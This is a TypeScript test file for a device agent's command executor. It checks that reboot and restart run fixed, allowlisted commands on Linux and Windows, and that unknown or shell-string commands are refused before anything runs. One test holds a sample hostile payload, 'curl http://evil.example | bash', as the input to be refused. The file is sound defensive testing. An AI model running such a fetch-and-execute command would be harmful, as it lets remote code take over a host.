import assert from "node:assert/strict"
import test from "node:test"

import {
  resolveAgentCommand,
  resolveAgentCommands,
  type AgentCommand,
} from "@nms/shared"

import {
  executeAgentCommand,
  executeResolvedCommands,
  type CommandRuntime,
} from "./execute"

function mockRuntime(platform: NodeJS.Platform = "linux") {
  const spawned: Array<{ file: string; args: readonly string[] }> = []
  const runtime: CommandRuntime = {
    platform,
    async spawnDetached(file, args) {
      spawned.push({ file, args })
    },
  }
  return { runtime, spawned }
}

test("reboot uses a hardcoded shutdown argv and never a shell string", async () => {
  const { runtime, spawned } = mockRuntime("linux")
  const result = await executeAgentCommand(
    { id: "aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa", kind: "reboot" },
    runtime
  )
  assert.equal(result.status, "succeeded")
  assert.deepEqual(spawned, [{ file: "/sbin/shutdown", args: ["-r", "now"] }])
})

test("restart uses a hardcoded service unit name", async () => {
  const { runtime, spawned } = mockRuntime("linux")
  const result = await executeAgentCommand(
    { id: "bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb", kind: "restart" },
    runtime
  )
  assert.equal(result.status, "succeeded")
  assert.deepEqual(spawned, [
    {
      file: "/bin/systemctl",
      args: ["restart", "lockhaven-agent.service"],
    },
  ])
})

test("update does not spawn a process", async () => {
  const { runtime, spawned } = mockRuntime()
  const result = await executeAgentCommand(
    { id: "cccccccc-cccc-4ccc-8ccc-cccccccccccc", kind: "update" },
    runtime
  )
  assert.equal(result.status, "failed")
  assert.equal(spawned.length, 0)
})

test("hub payloads with shell strings are refused before spawn", async () => {
  const { runtime, spawned } = mockRuntime()
  const resolved = resolveAgentCommand({
    id: "dddddddd-dddd-4ddd-8ddd-dddddddddddd",
    kind: "reboot",
    command: "curl http://evil.example | bash",
  })
  assert.equal(resolved.ok, false)
  if (!resolved.ok) {
    assert.equal(resolved.result.status, "refused")
  }
  assert.equal(spawned.length, 0)
  void runtime
})

test("unknown command kinds never reach the executor", async () => {
  const { runtime, spawned } = mockRuntime()
  const { accepted, refused } = resolveAgentCommands([
    {
      id: "eeeeeeee-eeee-4eee-8eee-eeeeeeeeeeee",
      kind: "reboot",
    },
    {
      id: "ffffffff-ffff-4fff-8fff-ffffffffffff",
      kind: "ssh",
      command: "id",
    },
  ])
  const results = [
    ...refused,
    ...(await executeResolvedCommands(accepted, runtime)),
  ]
  assert.equal(spawned.length, 1)
  assert.deepEqual(spawned[0]?.args, ["-r", "now"])
  assert.equal(
    results.find((row) => row.id === "ffffffff-ffff-4fff-8fff-ffffffffffff")
      ?.status,
    "refused"
  )
})

test("windows reboot uses shutdown.exe with fixed flags", async () => {
  const { runtime, spawned } = mockRuntime("win32")
  await executeAgentCommand(
    { id: "aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa", kind: "reboot" },
    runtime
  )
  assert.deepEqual(spawned, [{ file: "shutdown.exe", args: ["/r", "/t", "0"] }])
})

test("executor type only accepts allowlisted kinds", () => {
  const command: AgentCommand = {
    id: "aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa",
    kind: "reboot",
  }
  assert.equal(command.kind, "reboot")
})
